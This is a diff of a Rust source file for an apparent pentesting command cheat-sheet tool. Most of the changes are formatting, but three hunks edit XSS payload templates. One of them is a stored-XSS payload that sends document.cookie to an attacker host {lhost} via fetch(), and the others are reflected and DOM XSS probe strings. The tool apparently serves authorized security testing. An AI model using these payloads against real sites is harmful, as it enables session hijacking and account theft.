@@ -1,12 +1,11 @@
 use serde::{Deserialize, Serialize};
 
-/// A single command template with metadata
-#[derive(Debug, Clone, Serialize, Deserialize)]
+#[derive(Debug, Clone, Serialize)]
 pub struct Command {
     pub name: &'static str,
     pub description: &'static str,
-    pub template: &'static str,    // raw template, {target} {port} etc are placeholders
-    pub params: &'static [Param],  // which params this command needs
+    pub template: &'static str,
+    pub params: &'static [Param],
     pub tags: &'static [&'static str],
     pub category: Category,
 }
@@ -24,12 +23,12 @@ pub enum Category {
 impl Category {
     pub fn label(&self) -> &'static str {
         match self {
-            Category::Recon  => "🔍 Recon / nmap",
-            Category::Web    => "🌐 Web (ffuf/gobuster/nikto)",
-            Category::Smb    => "📁 SMB / enum4linux",
-            Category::Sqli   => "💉 SQLi / XSS helpers",
+            Category::Recon => "🔍 Recon / nmap",
+            Category::Web => "🌐 Web (ffuf/gobuster/nikto)",
+            Category::Smb => "📁 SMB / enum4linux",
+            Category::Sqli => "💉 SQLi / XSS helpers",
             Category::Shells => "🐚 Reverse Shells",
-            Category::Cve    => "🔥 CVE Lookups",
+            Category::Cve => "🔥 CVE Lookups",
         }
     }
 
@@ -46,18 +45,18 @@ impl Category {
 
     pub fn from_str(s: &str) -> Option<Category> {
         match s.to_lowercase().as_str() {
-            "recon"  => Some(Category::Recon),
-            "web"    => Some(Category::Web),
-            "smb"    => Some(Category::Smb),
-            "sqli"   => Some(Category::Sqli),
+            "recon" => Some(Category::Recon),
+            "web" => Some(Category::Web),
+            "smb" => Some(Category::Smb),
+            "sqli" => Some(Category::Sqli),
             "shells" => Some(Category::Shells),
-            "cve"    => Some(Category::Cve),
+            "cve" => Some(Category::Cve),
             _ => None,
         }
     }
 }
 
-#[derive(Debug, Clone, Serialize, Deserialize)]
+#[derive(Debug, Clone, Serialize)]
 pub struct Param {
     pub key: &'static str,
     pub label: &'static str,
@@ -361,7 +360,7 @@ pub const SQLI_COMMANDS: &[Command] = &[
     Command {
         name: "XSS - Reflected Test",
         description: "Basic reflected XSS payloads to try",
-        template: "# Reflected XSS payloads for: http://{target}/{path}?{param}=\n# Try these:\n<script>alert(1)</script>\n\"><script>alert(1)</script>\n'><img src=x onerror=alert(1)>\n<svg onload=alert(1)>\njavascript:alert(1)",
+        template: "# Reflected XSS payloads for: http://{target}/{path}?{param}=\n# Try these:\n\n\"><script>alert(1)</script>\n'><script>alert(1)</script>\n<img src=x onerror=alert(1)>\njavascript:alert(1)",
         params: &[
             Param { key: "target", label: "Target host", default: None },
             Param { key: "path", label: "Path", default: Some("search.php") },
@@ -373,7 +372,7 @@ pub const SQLI_COMMANDS: &[Command] = &[
     Command {
         name: "XSS - Stored Payload",
         description: "Stored XSS payload with callback",
-        template: "# Stored XSS — inject into {field} at http://{target}\n<script>fetch('http://{lhost}/steal?c='+document.cookie)</script>\n<img src=x onerror=\"this.src='http://{lhost}/steal?c='+document.cookie\">",
+        template: "# Stored XSS — inject into {field} at http://{target}\n\n<script>fetch('http://{lhost}:8000/?c='+document.cookie)</script>",
         params: &[
             Param { key: "target", label: "Target host", default: None },
             Param { key: "field", label: "Injectable field", default: Some("comment") },
@@ -385,7 +384,7 @@ pub const SQLI_COMMANDS: &[Command] = &[
     Command {
         name: "XSS - DOM-Based",
         description: "DOM-based XSS payloads",
-        template: "# DOM XSS test for http://{target}/#\n# Fragment-based:\nhttp://{target}/#{payload}\n# Payloads:\n<img src=x onerror=alert(1)>\n\"><script>alert(document.domain)</script>",
+        template: "# DOM XSS test for http://{target}/#\n# Fragment-based:\nhttp://{target}/#{payload}\n# Payloads:\n<img src=x onerror=alert(1)>\n\"><img src=x onerror=alert(1)>",
         params: &[
             Param { key: "target", label: "Target host", default: None },
             Param { key: "payload", label: "Initial payload", default: Some("<img src=x onerror=alert(1)>") },
@@ -575,12 +574,12 @@ pub const CVE_COMMANDS: &[Command] = &[
 
 pub fn get_commands(category: &Category) -> &'static [Command] {
     match category {
-        Category::Recon  => RECON_COMMANDS,
-        Category::Web    => WEB_COMMANDS,
-        Category::Smb    => SMB_COMMANDS,
-        Category::Sqli   => SQLI_COMMANDS,
+        Category::Recon => RECON_COMMANDS,
+        Category::Web => WEB_COMMANDS,
+        Category::Smb => SMB_COMMANDS,
+        Category::Sqli => SQLI_COMMANDS,
         Category::Shells => SHELL_COMMANDS,
-        Category::Cve    => CVE_COMMANDS,
+        Category::Cve => CVE_COMMANDS,
     }
 }
 
